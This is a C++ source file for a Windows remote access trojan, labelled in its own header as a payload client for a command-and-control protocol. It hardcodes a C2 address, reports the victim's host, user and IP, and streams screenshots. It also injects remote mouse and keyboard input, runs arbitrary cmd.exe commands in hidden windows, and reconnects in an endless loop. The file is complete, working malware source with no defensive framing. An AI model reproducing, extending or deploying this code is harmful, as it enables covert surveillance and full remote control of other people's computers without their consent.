// netkit/evasion/rat_client.cpp — native payload client, netkit C2 protocol.
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wincodec.h>
#include <objbase.h>
#include <string>
#include <vector>
#include <cstdio>
#include <cstdint>
#include <cstdlib>
#include <thread>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "ole32.lib")

enum : uint8_t { MSG_HELLO = 0, MSG_FRAME = 1, MSG_INPUT = 2, MSG_CMD = 3, MSG_CMD_OUT = 4 };

static const char* DEFAULT_C2 = "192.168.1.10:4444";

#pragma pack(push, 1)
struct MsgHeader { uint32_t length; uint8_t type; };
#pragma pack(pop)

static bool SendAll(SOCKET s, const void* data, size_t len) {
    const char* p = (const char*)data;
    while (len) {
        int n = send(s, p, (int)len, 0);
        if (n <= 0) return false;
        p += n; len -= (size_t)n;
    }
    return true;
}

static bool SendMsg(SOCKET s, uint8_t type, const void* payload, uint32_t len) {
    MsgHeader h{ len, type };
    return SendAll(s, &h, sizeof h) && (len == 0 || SendAll(s, payload, len));
}

static bool RecvAll(SOCKET s, void* data, size_t len) {
    char* p = (char*)data;
    while (len) {
        int n = recv(s, p, (int)len, 0);
        if (n <= 0) return false;
        p += n; len -= (size_t)n;
    }
    return true;
}

static bool RecvMsg(SOCKET s, uint8_t& type, std::vector<char>& payload) {
    MsgHeader h;
    if (!RecvAll(s, &h, sizeof h)) return false;
    payload.resize(h.length);
    if (h.length && !RecvAll(s, payload.data(), h.length)) return false;
    type = h.type;
    return true;
}

// --- minimal JSON pluckers (protocol fields only) ---
static const char* JValue(const std::vector<char>& j, const char* key) {
    std::string k = "\"" + std::string(key) + "\"";
    auto it = std::search(j.begin(), j.end(), k.begin(), k.end());
    if (it == j.end()) return nullptr;
    const char* s = j.data() + (it - j.begin()) + k.size();
    while (*s && (*s == ':' || *s == ' ' || *s == '\t')) s++;
    return s;
}

static bool JNumber(const std::vector<char>& j, const char* key, double& out) {
    const char* s = JValue(j, key);
    if (!s) return false;
    char* end = nullptr;
    out = strtod(s, &end);
    return end != s;
}

static bool JString(const std::vector<char>& j, const char* key, std::string& out) {
    const char* s = JValue(j, key);
    if (!s || *s != '"') return false;
    s++;
    std::string v;
    while (*s && *s != '"') {
        if (*s == '\\' && s[1]) s++;
        v += *s++;
    }
    out = std::move(v);
    return true;
}

static std::string JsonEscape(const std::string& in) {
    std::string o; o.reserve(in.size() + 16);
    for (unsigned char c : in) {
        switch (c) {
            case '"':  o += "\\\""; break;
            case '\\': o += "\\\\"; break;
            case '\n': o += "\\n";  break;
            case '\r': o += "\\r";  break;
            case '\t': o += "\\t";  break;
            default:
                if (c < 0x20) { char b[8]; sprintf_s(b, "\\u%04x", c); o += b; }
                else o += (char)c;
        }
    }
    return o;
}

// --- input injection ---
static int ScreenW() { return GetSystemMetrics(SM_CXSCREEN); }
static int ScreenH() { return GetSystemMetrics(SM_CYSCREEN); }

static INPUT KeyInput(WORD vk, bool up) {
    INPUT i{};
    i.type = INPUT_KEYBOARD;
    i.ki.wVk = vk;
    i.ki.dwFlags = up ? KEYEVENTF_KEYUP : 0;
    return i;
}

static int SpecialVk(const std::string& k) {
    struct { const char* name; int vk; } m[] = {
        {"enter", VK_RETURN}, {"esc", VK_ESCAPE}, {"backspace", VK_BACK},
        {"tab", VK_TAB}, {"space", VK_SPACE}, {"shift", VK_LSHIFT},
        {"ctrl", VK_LCONTROL}, {"alt", VK_LMENU}, {"win", VK_LWIN},
        {"caps_lock", VK_CAPITAL}, {"delete", VK_DELETE}, {"home", VK_HOME},
        {"end", VK_END}, {"page_up", VK_PRIOR}, {"page_down", VK_NEXT},
        {"up", VK_UP}, {"down", VK_DOWN}, {"left", VK_LEFT}, {"right", VK_RIGHT},
        {"print_screen", VK_SNAPSHOT}, {"menu", VK_APPS},
    };
    for (auto& e : m) if (k == e.name) return e.vk;
    if (k.size() >= 2 && k[0] == 'f') {
        int n = atoi(k.c_str() + 1);
        if (n >= 1 && n <= 12) return VK_F1 + n - 1;
    }
    return 0;
}

static void ApplyInput(const std::vector<char>& j) {
    std::string t;
    if (!JString(j, "t", t)) return;
    double x = 0, y = 0, d = 0, b = 1;

    if (t == "m") {
        if (JNumber(j, "x", x) && JNumber(j, "y", y))
            SetCursorPos((int)(x * ScreenW()), (int)(y * ScreenH()));
        return;
    }
    if (t == "c") {
        if (JNumber(j, "x", x) && JNumber(j, "y", y))
            SetCursorPos((int)(x * ScreenW()), (int)(y * ScreenH()));
        JNumber(j, "b", b);
        JNumber(j, "d", d);
        INPUT in{};
        in.type = INPUT_MOUSE;
        bool down = d != 0;
        if ((int)b == 2)
            in.mi.dwFlags = down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
        else
            in.mi.dwFlags = down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
        SendInput(1, &in, sizeof(INPUT));
        return;
    }
    if (t == "s") {
        if (JNumber(j, "x", x) && JNumber(j, "y", y))
            SetCursorPos((int)(x * ScreenW()), (int)(y * ScreenH()));
        JNumber(j, "d", d);
        INPUT in{};
        in.type = INPUT_MOUSE;
        in.mi.dwFlags = MOUSEEVENTF_WHEEL;
        in.mi.mouseData = (DWORD)((LONG)d * WHEEL_DELTA);
        SendInput(1, &in, sizeof(INPUT));
        return;
    }
    if (t == "k") {
        std::string k;
        if (!JString(j, "k", k) || !JNumber(j, "d", d)) return;
        bool down = d != 0;
        int vk = SpecialVk(k);
        INPUT in[3]{}; int n = 0;
        if (vk) {
            in[n++] = KeyInput((WORD)vk, !down);
        } else if (k.size() == 1) {
            SHORT sc = VkKeyScanA(k[0]);
            if (sc == -1) return;
            WORD v = (WORD)LOBYTE(sc);
            bool shift = (HIBYTE(sc) & 1) != 0;
            if (down) {
                if (shift) in[n++] = KeyInput(VK_SHIFT, false);
                in[n++] = KeyInput(v, false);
            } else {
                in[n++] = KeyInput(v, true);
                if (shift) in[n++] = KeyInput(VK_SHIFT, true);
            }
        } else return;
        SendInput(n, in, sizeof(INPUT));
        return;
    }
}

// --- shell ---
static std::string RunCmd(const std::string& cmd) {
    std::string full = "cmd.exe /c " + cmd + " 2>&1";
    SECURITY_ATTRIBUTES sa{ sizeof sa, NULL, TRUE };
    HANDLE rd = nullptr, wr = nullptr;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return "pipe failed";
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};

    std::vector<char> line(full.begin(), full.end());
    line.push_back(0);
    if (!CreateProcessA(NULL, line.data(), NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(rd); CloseHandle(wr);
        return "spawn failed";
    }
    CloseHandle(wr);

    std::string out;
    char tmp[4096]; DWORD n = 0;
    while (ReadFile(rd, tmp, sizeof tmp, &n, NULL) && n) {
        out.append(tmp, n);
        if (out.size() > 8192) break;
    }
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(rd);
    return out.substr(0, 8000);
}

// --- screen capture: GDI + WIC JPEG ---
class Screen {
public:
    explicit Screen(float scale, float quality) : scale_(scale), quality_(quality) {
        CoInitializeEx(NULL, COINIT_MULTITHREADED);
        CoCreateInstance(CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER,
                         IID_PPV_ARGS(&wic_));
    }
    ~Screen() { if (wic_) wic_->Release(); }

    bool Grab(std::vector<BYTE>& out) {
        if (!wic_) return false;
        int sw = ScreenW(), sh = ScreenH();
        if (sw <= 0 || sh <= 0) return false;
        int dw = (int)(sw * scale_); if (dw < 16) dw = 16;
        int dh = (int)(sh * scale_); if (dh < 16) dh = 16;

        HDC screen = GetDC(NULL);
        HDC mem = CreateCompatibleDC(screen);
        HBITMAP bmp = CreateCompatibleBitmap(screen, dw, dh);
        HGDIOBJ old = SelectObject(mem, bmp);
        SetStretchBltMode(mem, HALFTONE);
        SetBrushOrgEx(mem, 0, 0, NULL);
        StretchBlt(mem, 0, 0, dw, dh, screen, 0, 0, sw, sh, SRCCOPY);

        BITMAPINFO bi{};
        bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bi.bmiHeader.biWidth = dw;
        bi.bmiHeader.biHeight = -dh;   // top-down rows
        bi.bmiHeader.biPlanes = 1;
        bi.bmiHeader.biBitCount = 32;
        bi.bmiHeader.biCompression = BI_RGB;

        std::vector<BYTE> bgra((size_t)dw * dh * 4);
        int lines = GetDIBits(mem, bmp, 0, dh, bgra.data(), &bi, DIB_RGB_COLORS);

        SelectObject(mem, old);
        DeleteObject(bmp);
        DeleteDC(mem);
        ReleaseDC(NULL, screen);
        if (lines == 0) return false;
        return EncodeJpeg(bgra.data(), (UINT)dw, (UINT)dh, out);
    }

private:
    bool EncodeJpeg(const BYTE* bgra, UINT w, UINT h, std::vector<BYTE>& out) {
        IWICBitmap* src = nullptr;
        if (FAILED(wic_->CreateBitmapFromMemory(w, h, GUID_WICPixelFormat32bppBGRA,
                                                w * 4, w * h * 4,
                                                (BYTE*)bgra, &src)))
            return false;
        IWICFormatConverter* conv = nullptr;
        if (FAILED(wic_->CreateFormatConverter(&conv)) ||
            FAILED(conv->Initialize(src, GUID_WICPixelFormat24bppBGR,
                                    WICBitmapDitherTypeNone, NULL, 0.0,
                                    WICBitmapPaletteTypeMedianCut))) {
            if (conv) conv->Release();
            src->Release();
            return false;
        }
        IStream* stream = nullptr;
        if (FAILED(CreateStreamOnHGlobal(NULL, TRUE, &stream))) {
            conv->Release(); src->Release();
            return false;
        }
        IWICBitmapEncoder* enc = nullptr;
        IWICBitmapFrameEncode* frame = nullptr;
        IPropertyBag2* props = nullptr;
        bool ok = false;
        do {
            if (FAILED(wic_->CreateEncoder(GUID_ContainerFormatJpeg, NULL, &enc))) break;
            if (FAILED(enc->Initialize(stream, WICBitmapEncoderNoCache))) break;
            if (FAILED(enc->CreateNewFrame(&frame, &props))) break;
            if (props) {
                PROPBAG2 opt{};
                opt.pstrName = (LPOLESTR)L"ImageQuality";
                VARIANT v; VariantInit(&v);
                v.vt = VT_R4; v.fltVal = quality_;
                props->Write(1, &opt, &v);
            }
            if (FAILED(frame->Initialize(props))) break;
            if (FAILED(frame->SetSize(w, h))) break;
            WICPixelFormatGUID fmt = GUID_WICPixelFormat24bppBGR;
            if (FAILED(frame->SetPixelFormat(&fmt))) break;
            if (FAILED(frame->WriteSource(conv, NULL))) break;
            if (FAILED(frame->Commit())) break;
            if (FAILED(enc->Commit())) break;

            STATSTG st{};
            stream->Stat(&st, STATFLAG_NONAME);
            ULONG size = (ULONG)st.cbSize.QuadPart;
            out.resize(size);
            LARGE_INTEGER zero{};
            stream->Seek(zero, STREAM_SEEK_SET, NULL);
            ULONG got = 0;
            stream->Read(out.data(), size, &got);
            out.resize(got);
            ok = got > 0;
        } while (false);

        if (props) props->Release();
        if (frame) frame->Release();
        if (enc) enc->Release();
        stream->Release();
        conv->Release();
        src->Release();
        return ok;
    }

    IWICImagingFactory* wic_ = nullptr;
    float scale_, quality_;
};

// --- plumbing ---
static SOCKET Connect(const char* host, int port) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;
    sockaddr_in a{};
    a.sin_family = AF_INET;
    a.sin_port = htons((u_short)port);
    a.sin_addr.s_addr = inet_addr(host);
    if (a.sin_addr.s_addr == INADDR_NONE) {
        hostent* he = gethostbyname(host);
        if (!he) { closesocket(s); return INVALID_SOCKET; }
        a.sin_addr = *(in_addr*)he->h_addr;
    }
    int nd = 1;
    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (char*)&nd, sizeof nd);
    if (connect(s, (sockaddr*)&a, sizeof a) != 0) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    return s;
}

static std::string HelloJson(SOCKET s) {
    char host[128] = "?"; DWORD hl = sizeof host;
    GetComputerNameA(host, &hl);
    char user[128] = "?"; DWORD ul = sizeof user;
    GetUserNameA(user, &ul);
    sockaddr_in local{};
    int ll = sizeof local;
    getsockname(s, (sockaddr*)&local, &ll);
    char ip[64];
    snprintf(ip, sizeof ip, "%d.%d.%d.%d",
             local.sin_addr.S_un.S_un_b.s_b1, local.sin_addr.S_un.S_un_b.s_b2,
             local.sin_addr.S_un.S_un_b.s_b3, local.sin_addr.S_un.S_un_b.s_b4);
    char buf[512];
    snprintf(buf, sizeof buf,
             "{\"host\":\"%s\",\"user\":\"%s\",\"os\":\"Windows x64\",\"ip\":\"%s\"}",
             host, user, ip);
    return buf;
}

static void RunSession(const char* host, int port, float scale, float quality,
                       int fps, bool shell) {
    SOCKET s = Connect(host, port);
    if (s == INVALID_SOCKET) { Sleep(5000); return; }

    std::string hello = HelloJson(s);
    SendMsg(s, MSG_HELLO, hello.data(), (uint32_t)hello.size());

    std::thread reader([s, shell] {
        std::vector<char> payload;
        uint8_t type = 0;
        while (RecvMsg(s, type, payload)) {
            if (type == MSG_INPUT) {
                ApplyInput(payload);
            } else if (type == MSG_CMD && shell) {
                std::string cmd(payload.begin(), payload.end());
                std::string out = RunCmd(cmd);
                std::string j = "{\"out\":\"" + JsonEscape(out) + "\"}";
                SendMsg(s, MSG_CMD_OUT, j.data(), (uint32_t)j.size());
            }
        }
    });
    reader.detach();

    Screen screen(scale, quality);
    int delay = fps > 0 ? 1000 / fps : 66;
    std::vector<BYTE> jpg;
    for (;;) {
        jpg.clear();
        if (screen.Grab(jpg) && !jpg.empty()) {
            if (!SendMsg(s, MSG_FRAME, jpg.data(), (uint32_t)jpg.size())) break;
        }
        Sleep(delay);
    }
    closesocket(s);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    std::string c2 = DEFAULT_C2;
    float scale = 0.75f, quality = 0.6f;
    int fps = 15;
    bool shell = true;

    for (int i = 1; i < __argc; i++) {
        std::string a = __argv[i];
        if (a == "--c2" && i + 1 < __argc) c2 = __argv[++i];
        else if (a == "--scale" && i + 1 < __argc) scale = (float)atof(__argv[++i]);
        else if (a == "--fps" && i + 1 < __argc) fps = atoi(__argv[++i]);
        else if (a == "--no-shell") shell = false;
    }
    size_t colon = c2.rfind(':');
    if (colon == std::string::npos) return 1;
    std::string host = c2.substr(0, colon);
    int port = atoi(c2.c_str() + colon + 1);

    WSADATA wsa{};
    WSAStartup(MAKEWORD(2, 2), &wsa);
    for (;;) RunSession(host.c_str(), port, scale, quality, fps, shell);
}
